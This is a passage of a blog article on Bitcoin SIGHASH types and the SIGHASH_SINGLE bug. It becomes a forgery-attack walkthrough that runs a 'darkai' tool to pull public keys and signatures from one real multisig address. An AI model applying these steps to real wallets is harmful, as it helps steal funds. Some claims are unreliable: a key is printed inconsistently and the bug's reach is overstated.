<p><em>Types&nbsp;<code>SIGHASH</code>&nbsp;are&nbsp;<code>Bitcoin</code>&nbsp;a clever mechanism for managing the level of control and scope of digital signatures within transactions. They strike a balance between security, flexibility, and compatibility. The story includes unexpected complications, such as the bug with&nbsp;<code>SIGHASH_SINGLE</code>&nbsp;no corresponding output, which highlights the importance of a deep understanding of the technical details to successfully work with Bitcoin at an advanced level.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">How do the differences between SIGHASH_ALL, NONE and SINGLE affect the security of Bitcoin transactions?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-do-the-differences-between-sighash_all-none-and-single-affect-the-security-of-bitcoin-transactions"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The differences between the SIGHASH_ALL, SIGHASH_NONE, and SIGHASH_SINGLE signature types have a significant impact on&nbsp;<strong>the security</strong>&nbsp;of Bitcoin transactions because they determine which parts of the transaction are kept within the digital signature and therefore protected from modification.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1.&nbsp;<strong>SIGHASH_ALL – maximum security</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1sighash_all--maximum-security"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Description:</strong> Signing covers <strong>all inputs and all outputs of a transaction</strong> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Impact on safety:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Ensures that no input or output can be modified after signing.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Eliminates the possibility of substituting the recipient or the payment amount.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The signatory has full control over the final outcome of the transaction.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Risks:</strong> High rigidity – if you need to change anything (for example, add an output or increase the commission), you need to re-sign.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2.&nbsp;<strong>SIGHASH_NONE – open outputs, closed inputs</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2sighash_none--open-outputs-closed-inputs"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Description:</strong> All inputs are signed, and <strong>all outputs are left unsigned</strong> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Impact on safety:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Signature inputs are protected, but outputs can be changed by anyone after signing.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Abuse potential: An attacker can change the addresses and amounts of a transfer after signing.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Usage:</strong> Rarely used, mainly in trusted collaboration protocols and cooperative scenarios.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Risks:</strong> If an attacker gains access to signatures, they can send funds to their addresses without the signatory’s consent.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3.&nbsp;<strong>SIGHASH_SINGLE — signature of the corresponding input and output</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#3sighash_single--signature-of-the-corresponding-input-and-output"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Description:</strong> Signs all inputs, but <strong>only the output with the same index as the input signature</strong> .</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Impact on safety:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Allows the signer to control only one specific output, while the others remain modifiable.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If the number of outputs is less than the number of inputs, a bug occurs: for a missing output, the hash is 1, which can lead to vulnerabilities.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Allows for more flexible distribution of funds management, but such flexibility comes with a reduction in the guarantees of safe spending.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Risks:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Possibility of replacing or removing uncovered outputs.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Not suitable for transactions where it is important to keep the entire payment logic unchanged.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">The final impact</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-final-impact"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Type Sighash</th><th>What is being signed?</th><th>Security level</th><th>Possible risks</th><th>Application</th></tr></thead><tbody><tr><td><strong>SIGHASH_ALL</strong></td><td>All inputs and outputs of the transaction</td><td>Maximum – no changes at all</td><td>Requirement for change (need to re-sign the transaction)</td><td>Standard for most payments</td></tr><tr><td><strong>SIGHASH_NONE</strong></td><td>All ins,&nbsp;<strong>no outs</strong></td><td>Medium – outputs are not protected</td><td>Substitution of outputs, loss of control over recipients</td><td>Cooperative scenarios, multi-signature</td></tr><tr><td><strong>SIGHASH_SINGLE</strong></td><td>All inputs, output with index corresponding to input</td><td>Low – only one output will be protected</td><td>Bug in the absence of the corresponding output, partial substitution</td><td>Partial payments, complex scenarios</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">The choice of SIGHASH type directly affects the degree of trust in a transaction in the Bitcoin cryptocurrency network:</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-choice-of-sighash-type-directly-affects-the-degree-of-trust-in-a-transaction-in-the-bitcoin-cryptocurrency-network"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>SIGHASH_ALL provides the highest level of security</strong> , which is why it is widely used for most transactions.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>SIGHASH_NONE and SIGHASH_SINGLE provide flexibility and partial signing</strong> , which can be useful in certain cases, but also increases the risks of spoofing and abuse.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Understanding these differences is critical when designing multi-signature schemes, complex protocols, and Bitcoin smart contracts, where the balance between flexibility and security must be carefully balanced.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">How Misuse of SIGHASH_ALL Can Lead to Vulnerabilities in Transactions</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#how-misuse-of-sighash_all-can-lead-to-vulnerabilities-in-transactions"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Incorrect use or lack of correct implementation of SIGHASH_ALL in Bitcoin transaction signatures can lead to serious vulnerabilities affecting the security of funds and the integrity of the system. The key aspects of these vulnerabilities are:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong><a href="https://cryptodeeptech.ru/signature-malleability/">Signature Malleability:</a></strong><br>Although SIGHASH_ALL implies that all inputs and outputs of a transaction are signed, due to the nature of the ECDSA algorithm it is possible for the same transaction to have multiple different, but valid signatures. This is because the signature component<em> s</em> can take equivalent values. An attacker can modify the signature without changing the contents of the transaction, which causes the transaction identifier (txid) to change. This makes it difficult to track transactions, makes replay attacks difficult, and can be used for fraud or double spending.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptodeeptech.ru/deserialize-signature-vulnerability-bitcoin/">DeserializeSignature Errors:</a></strong><br>If the signature verification function (including SIGHASH_ALL) does not handle the signature structure correctly, such as checking that<em> r</em> and<em> s</em> are within the allowed ranges and not zero, this allows attackers to create invalid but accepted signatures. Such forged signatures can be used to authorize unauthorized transactions, steal funds, double-spend, and corrupt the blockchain.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptodeeptech.ru/twist-attack/">Insufficient validation of signature parameters:</a></strong><br>Incorrect or incomplete validation of a signature with the flag<code>SIGHASH_ALL</code>, such as ignoring or incorrectly handling the trailing byte, can result in transactions with incorrect coverage of the elements being signed (inputs and outputs) being validated. This opens the door to attacks in which an attacker manipulates parts of a transaction to disable protection or escalate their privileges.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptodeeptech.ru/private-key-debug/">Replay attacks and transaction collision:</a></strong><br>Due to the possibility of changing a signature without changing the contents of a transaction (see<strong><a href="https://cryptodeeptech.ru/signature-malleability/"> Signature Malleability</a></strong> ), a single transaction can be reused or a collision created, creating the risk of double spending or financial loss.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-5.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-5.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallet Operational Methods with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Thus, incorrect use&nbsp;<code>SIGHASH_ALL</code>or errors in the implementation of its verification significantly undermine the security of the Bitcoin network, allowing attackers to manipulate signatures and transactions. To combat these vulnerabilities, strict checks of the format and ranges of signatures are being implemented, improved protocols are used (for example,&nbsp;<code>SegWit</code>eliminating some of the problems with signature variability), and secure methods of signing and validating transactions are being standardized.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>An invalid signature with the SIGHASH_ALL type increases the risk of double spending in Bitcoin for the following reasons:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>When using SIGHASH_ALL, the signature covers&nbsp;<strong>all inputs and outputs</strong>&nbsp;of the transaction, ensuring that no element of the transaction can be changed after signing. However, if the signature is formed incorrectly, for example due to errors in the random number generation or the formation of the signature parameters (r, s) themselves, this may lead to the fact that part of the transaction can be changed without invalidating the signature. In particular, a vulnerability arises in which an attacker can change individual fields or the structure of the transaction, creating variations that are accepted by the network as valid, but differ from the original.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>This signature malleability&nbsp;<strong><a href="https://cryptodeeptech.ru/signature-malleability/">allows</a></strong>&nbsp;attackers to create alternative versions of a transaction with a different identifier (&nbsp;<code>txid</code>), making it difficult to track and confirm payments, and in some cases leading to&nbsp;<strong>the reuse of the same inputs</strong>&nbsp;– i.e. double spending.</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Additionally, if the signature validation implementation does&nbsp;<code>SIGHASH_ALL</code>not strictly check the correctness of the signature parameters and data format, an attacker can issue fake signatures or exploit protocol bugs to bypass the checks. This leaves an open opportunity for manipulation and creation of conflicting transactions.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Thus, to reduce the risk of double spending, it is critical to correctly generate and validate signatures with&nbsp;<code>SIGHASH_ALL</code>, apply protection methods&nbsp;<code>signature malleability</code>(e.g.&nbsp;<code>SegWit</code>), and update software and follow security recommendations. This ensures that the signature is anchored to the entire transaction structure, ensuring its immutability and resistance to abuse.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Let’s get information about the public keys associated with a Bitcoin address&nbsp;<code><strong><a href="https://btc1.trezor.io/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe">32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</a></strong></code>. Below is a detailed and informative analysis of the data obtained.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -pubkey 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Received public keys:</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#received-public-keys"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The team’s work resulted in a list of three public keys extracted in compressed format&nbsp;<code>(compressed public key)</code>, presented in hexadecimal form:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong><code>pubkey</code> = &#91;  '023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d9f359e37e39f0561196',  '03d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b80',  '03ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df']</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Public Keys:</strong> Each element is a user’s public key in compressed public key format, 33 bytes long. Compressed keys typically begin with a prefix <code>02</code>or <code>03</code>, indicating the sign of the point’s (Y) coordinate on the elliptic curve, followed by 32 bytes of the X coordinate.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Link to address:</strong> A Bitcoin address is a hash of a script or public key. In this case, the address <code><a href="https://btc1.trezor.io/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe">32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</a></code>corresponds to some P2SH (Pay-to-Script-Hash) or multi-signature address, which is characterized by storing several public keys at once in a redeemScript. The list of public keys corresponds to the set embedded in this safe.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>A set of several public keys is a classic situation for a multisig wallet. In this case, to spend funds, several signatures from the corresponding private keys are required:</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>This list of public keys allows you to determine which keys have the right to sign transactions with this address.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Typically, a multi-signature is formed according to the M-of-N scheme, for example, 2 out of 3, where <code>N</code>is the total number of keys, and <code>M</code>is the minimum number of signatures required for spending.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Using multiple keys increases security because compromising one key does not result in loss of control over funds.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Each public key can be verified individually or in combination to confirm the validity of the signatures.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-34-1024x51.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-34-1024x51.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Compressed public keys</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#compressed-public-keys"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The compression principle allows to reduce the length of the public key from 65 bytes (non-compressed format) to 33 bytes, which saves space in transactions and blocks.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The compressed key contains information about the X-coordinate of the point on the elliptic curve and the sign of the Y-coordinate.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Usage in redeemScript</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#usage-in-redeemscript"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>In the context of multisig, these public keys are typically included in <code>redeemScript</code>, which is used in P2SH scenarios.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To confirm the right to spend funds, it is necessary to provide signatures corresponding to the minimum required number of keys from this set.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>A Bitcoin address&nbsp;<code><a href="https://btc1.trezor.io/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe">32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</a></code>is associated with three specific public keys in a compressed key format. This is typical for multi-signature Bitcoin addresses, where signatures using some or all of these keys must be provided to authorize a spend, providing a high level of security and flexibility in managing funds.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>For a deeper analysis and understanding of the parameters, you can further study:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The specific redeemScript format this set of private and public keys is associated with.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Signature policy (how many of these three signatures are required).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The history of transactions associated with this address.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://btc1.trezor.io/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe">Public keys 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#public-keys-32gkpb9xjmaelr4q2hr31jdz2tnty18zce"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The public key&nbsp;<code>023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f0561196</code>is one of the elements used in the&nbsp;<a href="https://habr.com/ru/articles/751734/">BitPay Copay</a>&nbsp;multi-signature wallet , which was the target of&nbsp;<a href="https://habr.com/ru/articles/751734/">an attack</a>&nbsp;involving a vulnerability in the handling of the SIGHASH_SINGLE signature type.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This public key, along with two others (&nbsp;<code>03d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b80</code>and&nbsp;<code>03ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df</code>), is part of the redeemScript of the Copay wallet, which is a 2-of&nbsp;<a href="https://habr.com/ru/articles/751734/">-3</a>&nbsp;multi-signature wallet . To spend funds from such an address, you must provide two valid signatures and the&nbsp;<code>redeemScript</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>RedeemScript, which contains these three public keys, yields the following instructions when decoded:&nbsp;<code>2 &lt;pubkey1&gt; &lt;pubkey2&gt; &lt;pubkey3&gt; 3 OP_CHECKMULTISIG</code>. This means that two signatures out of three possible keys are required to verify the multisig.&nbsp;<code>OP_CHECKMULTISIG</code>checks each signature/public key pair for validity, ensuring that all signatures match one of the public keys. The OP_FALSE instruction in scriptSig is required due to a known bug where OP_CHECKMULTISIG removes an extra unused value from the stack.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><a href="https://habr.com/ru/articles/751734/">The Copay</a>&nbsp;wallet&nbsp;developed by&nbsp;<a href="https://habr.com/ru/articles/751734/">BitPay</a>&nbsp;has been attacked, the details of which were disclosed by Coinspect. The attack exploited the SIGHASH_SINGLE signature type, which only signs the corresponding input and output (the output with the same index as the input). If an output with that index does not exist, the integer value “one” will be returned as the transaction hash, which is a known bug that&nbsp;&nbsp;<code>OP_CHECKMULTISIG</code>&nbsp;checks the authenticity of two signatures from three public keys.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This multi-signature set has come into the spotlight due to a vulnerability discovered by Coinspect. The vulnerability is related to the way transactions use a signature type&nbsp;&nbsp;<code>SIGHASH_SINGLE&nbsp;(0x03)</code>, in which the signature covers all inputs and exactly one output of the transaction with an index that matches the index of the input.&nbsp;<strong>It is important to note that if there is no output with such an index (and in some cases there are fewer of them than inputs), due to a Bitcoin bug, the hash for the signature is returned as an integer “1”. This allows transactions to be created that spend outputs without knowledge of the private keys, which opens the door to theft of funds from the multi-signature wallet.</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-18-1024x47.png"></a><strong><a href="https://habr.com/ru/articles/751734/">BitPay Copay</a>&nbsp;Multi-Signature Wallet&nbsp;Was Target of Attack Illustrating the Importance of Digital&nbsp;<a href="https://cryptodeeptech.ru/digital-signature-forgery-attack/">Signature Forgery Attack</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Thus, the public key&nbsp;&nbsp;<code>03d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b80</code>&nbsp;is a key component of the vulnerable Copay multi-signature wallet, whose participation in the composite redeemScript provides certain security benefits, but has also become the subject of experiments and attacks illustrating the importance of correctly handling all types of signatures in Bitcoin.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">The Important Role of redeemScript and Multi-Signature</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#the-important-role-of-redeemscript-and-multi-signature"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The public key&nbsp;&nbsp;<code>03d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b80</code>&nbsp;is part of the redeemScript, which specifies the conditions for spending funds from a particular transaction output and has the following general format:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>2 &lt;pubkey1&gt; &lt;pubkey2&gt; &lt;pubkey3&gt; 3 OP_CHECKMULTISIG</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Where this key occupies one of the places&nbsp;&nbsp;<code>&lt;pubkeyN&gt;</code>. The instruction&nbsp;&nbsp;<code>OP_CHECKMULTISIG</code>&nbsp;checks that the signatures provided when spending the funds are correct and correspond to at least two of the three public keys.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>This public key, along with two others, defines a list of authorized owners to jointly manage funds in the Copay multi-signature wallet, which has demonstrated a known vulnerability related to improper handling of the signature type&nbsp;&nbsp;<code>SIGHASH_SINGLE</code>. The vulnerability allows attackers to create transactions with incorrect hashing, which is caused by a bug in the Bitcoin protocol when there is no corresponding output for an input with a certain index. This has led to possible attacks on wallets, including Copay.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>The public key&nbsp;&nbsp;<code>03ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df</code>&nbsp;is a key element of the security and flexibility of the Copay multi-signature wallet. It serves to jointly control funds and requires joint confirmation of transactions along with other keys in the set. At the same time, the vulnerability in question became an important example of the need for strict verification and updating of signature mechanisms in cryptocurrency systems.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let’s execute the command in which we will receive two processed digital signatures in DER format, associated with the specified Bitcoin address:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -decodesig 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>As a result, we get the result:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>decodesig = &#91;der_decode_sig('3045022100dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c2903'), der_decode_sig('304402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b803')]</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
